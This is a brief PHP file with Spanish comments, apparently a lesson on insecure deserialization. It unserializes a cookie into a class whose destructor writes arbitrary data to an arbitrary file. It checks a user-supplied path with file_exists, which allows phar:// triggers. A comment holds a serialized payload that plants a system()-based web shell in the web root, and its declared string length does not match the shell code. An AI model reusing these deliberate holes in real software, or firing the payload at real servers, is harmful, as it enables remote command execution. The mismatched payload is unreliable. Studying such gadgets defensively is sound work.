<?php
class Logger {
    public $file = '/tmp/app.log';
    public $data = '';
    // Gadget: al destruirse escribe $data en $file
    function __destruct() { file_put_contents($this->file, $this->data, FILE_APPEND); }
}

// Vuln 1: unserialize de una cookie
$prefs = unserialize(base64_decode($_COOKIE['prefs']));
// Payload: O:6:"Logger":2:{s:4:"file";s:23:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET['c']); ?>";}

// Vuln 2: phar:// dispara la deserializacion de la metadata del archivo
if (file_exists($_GET['path'])) { echo "exists"; }    // path=phar://uploads/avatar.jpg
